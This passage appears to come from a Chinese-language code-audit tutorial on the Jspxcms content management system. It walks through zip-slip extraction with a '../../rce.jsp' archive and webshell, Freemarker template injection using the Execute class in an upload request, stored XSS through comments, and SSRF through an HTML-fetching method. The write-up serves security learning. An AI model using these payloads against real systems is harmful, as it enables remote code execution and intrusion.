parentId + <span class="string">&quot;/&quot;</span> + file.<span class="title function_">getOriginalFilename</span>());</span><br><span class="line"><span class="title class_">Servlets</span>.<span class="title function_">writeHtml</span>(response, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进之，如下，可以发现该方法并未对文件名做安全检查，这里可能容易存在zip文件任意解压漏洞。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unzip</span>(<span class="params">File zipFile, File destDir, <span class="built_in">String</span> encoding</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (destDir.<span class="title function_">exists</span>() &amp;&amp; !destDir.<span class="title function_">isDirectory</span>()) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;destDir is not a directory!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">ZipFile</span> zip = <span class="literal">null</span>;</span><br><span class="line"><span class="title class_">InputStream</span> is = <span class="literal">null</span>;</span><br><span class="line"><span class="title class_">FileOutputStream</span> fos = <span class="literal">null</span>;</span><br><span class="line"><span class="title class_">File</span> file;</span><br><span class="line"><span class="title class_">String</span> name;</span><br><span class="line">byte[] buff = <span class="keyword">new</span> byte[<span class="variable constant_">DEFAULT_BUFFER_SIZE</span>];</span><br><span class="line">int readed;</span><br><span class="line"><span class="title class_">ZipEntry</span> entry;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title class_">StringUtils</span>.<span class="title function_">isNotBlank</span>(encoding)) &#123;</span><br><span class="line">zip = <span class="keyword">new</span> <span class="title class_">ZipFile</span>(zipFile, encoding);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">zip = <span class="keyword">new</span> <span class="title class_">ZipFile</span>(zipFile);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Enumeration</span>&lt;?&gt; en = zip.<span class="title function_">getEntries</span>();</span><br><span class="line"><span class="keyword">while</span> (en.<span class="title function_">hasMoreElements</span>()) &#123;</span><br><span class="line">entry = (<span class="title class_">ZipEntry</span>) en.<span class="title function_">nextElement</span>();</span><br><span class="line">name = entry.<span class="title function_">getName</span>();</span><br><span class="line">name = name.<span class="title function_">replace</span>(<span class="string">&#x27;/&#x27;</span>, <span class="title class_">File</span>.<span class="property">separatorChar</span>);</span><br><span class="line">file = <span class="keyword">new</span> <span class="title class_">File</span>(destDir, name);</span><br><span class="line"><span class="keyword">if</span> (entry.<span class="title function_">isDirectory</span>()) &#123;</span><br><span class="line">file.<span class="title function_">mkdirs</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// 创建父目录</span></span><br><span class="line">file.<span class="title function_">getParentFile</span>().<span class="title function_">mkdirs</span>();</span><br><span class="line">is = zip.<span class="title function_">getInputStream</span>(entry);</span><br><span class="line">fos = <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line"><span class="keyword">while</span> ((readed = is.<span class="title function_">read</span>(buff)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">fos.<span class="title function_">write</span>(buff, <span class="number">0</span>, readed);</span><br><span class="line">&#125;</span><br><span class="line">fos.<span class="title function_">close</span>();</span><br><span class="line">is.<span class="title function_">close</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (fos != <span class="literal">null</span>) &#123;</span><br><span class="line">fos.<span class="title function_">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (is != <span class="literal">null</span>) &#123;</span><br><span class="line">is.<span class="title function_">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (zip != <span class="literal">null</span>) &#123;</span><br><span class="line">zip.<span class="title function_">close</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="title class_">IOException</span> e) &#123;</span><br><span class="line">logger.<span class="title function_">error</span>(<span class="string">&quot;&quot;</span>, e);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造一个恶意的zip压缩包。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">zipinfo evilzip.<span class="property">zip</span></span><br><span class="line"><span class="title class_">Archive</span>:  evilzip.<span class="property">zip</span></span><br><span class="line"><span class="title class_">Zip</span> file <span class="attr">size</span>: <span class="number">561</span> bytes, number <span class="keyword">of</span> <span class="attr">entries</span>: <span class="number">2</span></span><br><span class="line">drwxr-xr-x  <span class="number">2.0</span> unx        <span class="number">0</span> bx stor <span class="number">22</span>-<span class="title class_">Mar</span>-<span class="number">16</span> <span class="number">13</span>:<span class="number">13</span> /</span><br><span class="line">-rw-r--r--  <span class="number">2.0</span> unx      <span class="number">604</span> bX defN <span class="number">22</span>-<span class="title class_">Mar</span>-<span class="number">16</span> <span class="number">13</span>:<span class="number">14</span> ../../rce.<span class="property">jsp</span></span><br></pre></td></tr></table></figure><p>然后上传，但是依旧是无法访问，可以发现在访问jsp后缀的文件时，会在前面加一个&#x2F;jsp前缀。</p><p><img src="/img/post/jspxcms-code-audit-learn/7.png"></p><p>回到IDAE中，发现相关过滤器如下。</p><p><img src="/img/post/jspxcms-code-audit-learn/8.png"></p><p>既然如此，那么尝试将jsp转成war，这样的目的是作为一个独立的web应用，就不会过如上过滤器了。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar -cf rce.<span class="property">war</span> ./rce.<span class="property">jsp</span></span><br></pre></td></tr></table></figure><p>然后再此上传，由于此次的环境是通过IDEA启动SpringBoot的，所以在这种情况下是依旧无法访问webshell的。但在实际tomcat部署方式中，这种方式肯定是可行的。</p><p><img src="/img/post/jspxcms-code-audit-learn/9.png"></p><h3 id="Freemarker-SSTI"><a href="#Freemarker-SSTI" class="headerlink" title="Freemarker SSTI"></a>Freemarker SSTI</h3><p>继续翻看后台相关功能，发现一个模版上传的功能，由于该应用使用的是Freemarker模板框架，所以此处可能存在模版注入漏洞的。</p><p><img src="/img/post/jspxcms-code-audit-learn/10.png"></p><p>上传一个恶意的模版。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> /cmscp/core/web_file_1/upload.<span class="property">do</span>?_site=<span class="number">1</span> <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Host</span>: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8088</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span>: <span class="number">496</span></span><br><span class="line"><span class="title class_">Accept</span>: text/html, *<span class="comment">/*; q=0.01</span></span><br><span class="line"><span class="comment">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAZrBHSAhmC9xfoEi</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate, br</span></span><br><span class="line"><span class="comment">Accept-Language: en-US,en;q=0.9</span></span><br><span class="line"><span class="comment">Cookie: open_ids=%2F1%2C%2F1%2Fdefault; select_id=%2F1%2Fm; OFBiz.Visitor=10000; _jspxcms=f1bcdbbcf4bb4413a5630543db361cd4; _site=1; JSESSIONID=1F497CF9E044E65C2DBAAE4ADAF1B2D7</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryAZrBHSAhmC9xfoEi</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;parentId&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">/1/rce</span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryAZrBHSAhmC9xfoEi</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;index.html&quot;</span></span><br><span class="line"><span class="comment">Content-Type: text/html</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">[#escape a as (a)!?html]</span></span><br><span class="line"><span class="comment">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="comment">&lt;html lang=&quot;zh-CN&quot;&gt;</span></span><br><span class="line"><span class="comment">&lt;head&gt;</span></span><br><span class="line"><span class="comment">&lt;meta charset=&quot;utf-8&quot;/&gt;</span></span><br><span class="line"><span class="comment">&lt;/head&gt;</span></span><br><span class="line"><span class="comment">&lt;body&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">$&#123;&quot;freemarker.template.utility.Execute&quot;?new()(&quot;open -a Calculator&quot;)&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;/body&gt;</span></span><br><span class="line"><span class="comment">&lt;/html&gt;</span></span><br><span class="line"><span class="comment">[/#escape]</span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryAZrBHSAhmC9xfoEi--</span></span><br></pre></td></tr></table></figure><p>回到IDEA中搜索相关功能点，相关处理方法如下，没有经过任意安全检查便直接写入了。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">protected <span class="keyword">void</span> <span class="title function_">upload</span>(<span class="title class_">MultipartFile</span> file, <span class="title class_">String</span> parentId, <span class="title class_">HttpServletRequest</span> request, <span class="title class_">HttpServletResponse</span> response)</span><br><span class="line">throws <span class="title class_">IllegalStateException</span>, <span class="title class_">IOException</span> &#123;</span><br><span class="line"><span class="title class_">Site</span> site = <span class="title class_">Context</span>.<span class="title function_">getCurrentSite</span>();</span><br><span class="line"><span class="comment">// parentId = parentId == null ? base : parentId;</span></span><br><span class="line"><span class="title class_">String</span> base = <span class="title function_">getBase</span>(site);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title class_">Validations</span>.<span class="title function_">uri</span>(parentId, base)) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">CmsException</span>(<span class="string">&quot;invalidURI&quot;</span>, parentId);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">FileHandler</span> fileHandler = <span class="title function_">getFileHandler</span>(site);</span><br><span class="line">fileHandler.<span class="title function_">store</span>(file, parentId);</span><br><span class="line">logService.<span class="title function_">operation</span>(<span class="string">&quot;opr.webFile.upload&quot;</span>, parentId + <span class="string">&quot;/&quot;</span> + file.<span class="title function_">getOriginalFilename</span>(), <span class="literal">null</span>, <span class="literal">null</span>, request);</span><br><span class="line">logger.<span class="title function_">info</span>(<span class="string">&quot;upload file, name=&#123;&#125;.&quot;</span>, parentId + <span class="string">&quot;/&quot;</span> + file.<span class="title function_">getOriginalFilename</span>());</span><br><span class="line"><span class="title class_">Servlets</span>.<span class="title function_">writeHtml</span>(response, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在成功上传后，然后去到系统管理-网站设置中，修改模板主题为刚刚上传的恶意模板。</p><p><img src="/img/post/jspxcms-code-audit-learn/11.png"></p><p>最后进行访问便可以触发命令执行。</p><p><img src="/img/post/jspxcms-code-audit-learn/12.png"></p><h2 id="0x05-XSS"><a href="#0x05-XSS" class="headerlink" title="0x05 XSS"></a>0x05 XSS</h2><p>寻找到一处评论框，尝试注入XSS弹窗payload，并使用Burpsuite拦截请求。</p><p><img src="/img/post/jspxcms-code-audit-learn/13.png"></p><p>通过HTTP报文得知，评论内容的参数为<code>text</code>。</p><p><img src="/img/post/jspxcms-code-audit-learn/14.png"></p><p>IDEA中搜索<code>comment_submit</code>路由，找到处理逻辑。</p><p><img src="/img/post/jspxcms-code-audit-learn/15.png"></p><p>处理方法如下，<code>submit</code>方法未对text做任何检查过滤，直接传入<code>submit</code>的重载方法中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/comment_submit&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">submit</span><span class="params">(String fname, String ftype, Integer fid,</span></span><br><span class="line"><span class="params">Integer parentId, String text, String captcha,</span></span><br><span class="line"><span class="params">HttpServletRequest request, HttpServletResponse response,</span></span><br><span class="line"><span class="params">org.springframework.ui.Model modelMap)</span></span><br><span class="line"><span class="keyword">throws</span> InstantiationException, IllegalAccessException,</span><br><span class="line">ClassNotFoundException &#123;</span><br><span class="line"><span class="keyword">return</span> submit(<span class="literal">null</span>, fname, ftype, fid, parentId, text, captcha,</span><br><span class="line">request, response, modelMap);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进重载方法中，在其中也是对<code>text</code>变量进行了非空判断和去敏感词。然后将<code>text</code>变量的值赋给comment对象中的<code>text</code>变量。最后到205行的由<code>CommentService.save</code>接口实现的<code>service.save</code>方法调用comment实例。</p><p><img src="/img/post/jspxcms-code-audit-learn/16.png"></p><p>接口<code>CommentService</code>的实现类为<code>CommentServiceImpl</code>，继续跟进其中的<code>save</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Transactional</span></span><br><span class="line"><span class="keyword">public</span> Comment <span class="title function_">save</span><span class="params">(Comment bean, Integer userId, Integer siteId, Integer parentId)</span> &#123;</span><br><span class="line"><span class="type">Site</span> <span class="variable">site</span> <span class="operator">=</span> siteService.get(siteId);</span><br><span class="line">bean.setSite(site);</span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> userService.get(userId);</span><br><span class="line">bean.setCreator(user);</span><br><span class="line"><span class="keyword">if</span> (parentId != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="type">Comment</span> <span class="variable">parent</span> <span class="operator">=</span> get(parentId);</span><br><span class="line">bean.setParent(parent);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (StringUtils.isNotBlank(bean.getIp())) &#123;</span><br><span class="line">bean.setCountry(ipSeeker.getCountry(bean.getIp()));</span><br><span class="line">bean.setArea(ipSeeker.getArea(bean.getIp()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bean.applyDefaultValue();</span><br><span class="line">bean = dao.save(bean);</span><br><span class="line">dao.flushAndRefresh(bean);</span><br><span class="line"><span class="keyword">if</span> (bean.getStatus() == Comment.AUDITED) &#123;</span><br><span class="line"><span class="type">Object</span> <span class="variable">anchor</span> <span class="operator">=</span> bean.getAnchor();</span><br><span class="line"><span class="keyword">if</span> (anchor <span class="keyword">instanceof</span> Commentable) &#123;</span><br><span class="line">((Commentable) anchor).addComments(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> bean;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在该方法中，也未对<code>bean</code>做任何安全处理，最终通过<code>dao.save</code>方法保存至数据库。但最后在页面上却没有触发XSS弹窗。</p><p><img src="/img/post/jspxcms-code-audit-learn/17.png"></p><p>同时，通过抓包发现，处理评论的是<code>comment_list</code>路由，并且payload被转义。</p><p><img src="/img/post/jspxcms-code-audit-learn/18.png"></p><p>回到IDEA查看处理<code>comment_list</code>路由的方法，如下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/comment_list&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">list</span><span class="params">(String ftype, Integer fid, Integer page,</span></span><br><span class="line"><span class="params">HttpServletRequest request, org.springframework.ui.Model modelMap)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> list(<span class="literal">null</span>, ftype, fid, page, request, modelMap);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping(Constants.SITE_PREFIX_PATH + &quot;/comment_list&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">list</span><span class="params">(<span class="meta">@PathVariable</span> String siteNumber, String ftype,</span></span><br><span class="line"><span class="params">Integer fid, Integer page, HttpServletRequest request,</span></span><br><span class="line"><span class="params">org.springframework.ui.Model modelMap)</span> &#123;</span><br><span class="line">siteResolver.resolveSite(siteNumber);</span><br><span class="line"><span class="type">Site</span> <span class="variable">site</span> <span class="operator">=</span> Context.getCurrentSite();</span><br><span class="line"><span class="keyword">if</span> (StringUtils.isBlank(ftype)) &#123;</span><br><span class="line">ftype = <span class="string">&quot;Info&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (fid == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="comment">// TODO</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">Object</span> <span class="variable">bean</span> <span class="operator">=</span> service.getEntity(ftype, fid);</span><br><span class="line"><span class="keyword">if</span> (bean == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="comment">// TODO</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">Anchor</span> <span class="variable">anchor</span> <span class="operator">=</span> (Anchor) bean;</span><br><span class="line"><span class="comment">// Site site = ((Siteable) bean).getSite();</span></span><br><span class="line"><span class="type">String</span> <span class="variable">tpl</span> <span class="operator">=</span> Servlets.getParam(request, <span class="string">&quot;tpl&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (StringUtils.isBlank(tpl)) &#123;</span><br><span class="line">tpl = <span class="string">&quot;_list&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">modelMap.addAttribute(<span class="string">&quot;anchor&quot;</span>, anchor);</span><br><span class="line">Map&lt;String, Object&gt; data = modelMap.asMap();</span><br><span class="line">ForeContext.setData(data, request);</span><br><span class="line">ForeContext.setPage(data, page);</span><br><span class="line"><span class="keyword">return</span> site.getTemplate(TPL_PREFIX + tpl + TPL_SUFFIX);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>list</code>方法的最后，将<code>sys_comment_list.html</code>传入<code>site.getTemplate</code>方法中。</p><p>而在<code>sys_comment_list.html</code>中有使用到Freemarker模版引擎中的转义。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[#escape x as (x)!?html]</span><br><span class="line">[#assign commentIndex = 1/]</span><br><span class="line">[#macro printComment parent]</span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;background-color:#FFE;border:1px solid #999;padding:3px;&quot;</span>&gt;</span></span><br><span class="line">[#if parent.parent??]</span><br><span class="line">...</span><br><span class="line">[/#if]</span><br><span class="line">[/#escape]</span><br></pre></td></tr></table></figure><p>在同级目录下排查不包含转义的html文件，结果如下，确定一个与评论有关的html，即<code>sys_member_space_comment.html</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">grep -L <span class="string">&quot;/#escape&quot;</span> *.html                                                                                                                                                                                                                                  130</span><br><span class="line">app_info_favorites.html</span><br><span class="line">app_notification.html</span><br><span class="line">inc_js.html</span><br><span class="line">list.html</span><br><span class="line">page.html</span><br><span class="line">sys_member_login_ajax.html</span><br><span class="line">sys_member_space_article.html</span><br><span class="line">sys_member_space_comment.html</span><br><span class="line">sys_operation_error.html</span><br><span class="line">sys_operation_success.html</span><br><span class="line">sys_operation_warning.html</span><br><span class="line">sys_rss.html</span><br></pre></td></tr></table></figure><p>而在<code>sys_member_space.html</code>中又对<code>sys_member_space_comment.html</code>进行了包含，需要当type请求参数的值为comment或article。</p><p><img src="/img/post/jspxcms-code-audit-learn/19.png"></p><p>继续在IDEA中搜索<code>sys_member_space.html</code>，发现当请求路径为<code>/space/&#123;id&#125;</code>，就会获取<code>sys_member_space.html</code>模版，最终成功执行存储性XSS。</p><p><img src="/img/post/jspxcms-code-audit-learn/20.png"></p><p><img src="/img/post/jspxcms-code-audit-learn/21.png"></p><h2 id="0x06-SSRF"><a href="#0x06-SSRF" class="headerlink" title="0x06 SSRF"></a>0x06 SSRF</h2><p>在审计SSRF漏洞前，需要知道Java中的一些常见的对外发送请求的方法。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Socket()</span><br><span class="line">OkHttpClient.newCall(request).execute()</span><br><span class="line">ImageIO.read()</span><br><span class="line">HttpClient.execute()</span><br><span class="line">HttpClient.executeMethod()</span><br><span class="line">HttpURLConnection.connect()</span><br><span class="line">HttpURLConnection.getInputStream()</span><br><span class="line">URL.openConnection()</span><br><span class="line">URL.openStream()</span><br><span class="line">HttpServletRequest()</span><br><span class="line">BasicHttpEntityEnclosingRequest()</span><br><span class="line">DefaultBHttpClientConnection()</span><br><span class="line">BasicHttpRequest()</span><br></pre></td></tr></table></figure><h3 id="HttpClient-execute"><a href="#HttpClient-execute" class="headerlink" title="HttpClient.execute()"></a>HttpClient.execute()</h3><p>在IDEA中直接搜索到<code>httpclient.execute</code>方法，这个方法实现自HttpClient类，发现有个获取HTML网页的方法。</p><p><img src="/img/post/jspxcms-code-audit-learn/22.png"></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title class_">Transient</span></span><br><span class="line">public <span class="keyword">static</span> <span class="title class_">String</span> <span class="title function_">fetchHtml</span>(<span class="title class_">CloseableHttpClient</span> httpclient, <span class="variable constant_">URI</span> uri,</span><br><span class="line"><span class="title class_">String</span> charset) throws <span class="title class_">ClientProtocolException</span>, <span class="title class_">IOException</span> &#123;</span><br><span class="line"><span class="title class_">HttpGet</span> httpget = <span class="keyword">new</span> <span class="title class_">HttpGet</span>(uri);</span><br><span class="line"><span class="title class_">CloseableHttpResponse</span> response = httpclient.<span class="title function_">execute</span>(httpget);</span><br><span class="line"><span class="title class_">String</span> html = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (response.<span class="title function_">getStatusLine</span>().<span class="title function_">getStatusCode</span>() == <span class="title class_">HttpServletResponse</span>.<span class="property">SC_OK</span>) &#123;</span><br><span class="line"><span class="title class_">HttpEntity</span> entity = response.<span class="title function_">getEntity</span>();</span><br><span class="line">html = <span class="title class_">EntityUtils</span>.<span class="title function_">toString</span>(entity, charset);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">response.<span class="title function_">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该方法有被重载方法调用。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title class_">Transient</span></span><br><span class="line">public <span class="keyword">static</span> <span class="title class_">String</span> <span class="title function_">fetchHtml</span>(<span class="variable constant_">URI</span> uri, <span class="title class_">String</span> charset, <span class="title class_">String</span> userAgent)</span><br><span class="line">throws <span class="title class_">ClientProtocolException</span>, <span class="title class_">IOException</span> &#123;</span><br><span class="line"><span class="title class_">CloseableHttpClient</span> httpclient = <span class="title class_">HttpClients</span>.<span class="title function_">custom</span>()</span><br><span class="line">.<span class="title function_">setUserAgent</span>(userAgent).<span class="title function_">build</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="title function_">fetchHtml</span>(httpclient, uri, charset);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查询该方法有被哪些方法调用，发现一个方法，在其中没有任何安全检查。</p><p><img src="/img/post/jspxcms-code-audit-learn/23.png"></p><p>直接尝试构造请求，结果如下，成功对本地发起SSRF。</p><p><img src="/img/post/jspxcms-code-audit-learn/24.png"></p><h3 id="URL-openConnection"><a href="#URL-openConnection" class="headerlink" title="URL.openConnection()"></a>URL.openConnection()</h3><p>继续搜索相关请求方法，发现存在<code>openConnection</code>方法，在如下<code>ueditorCatchImage</code>方法中。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 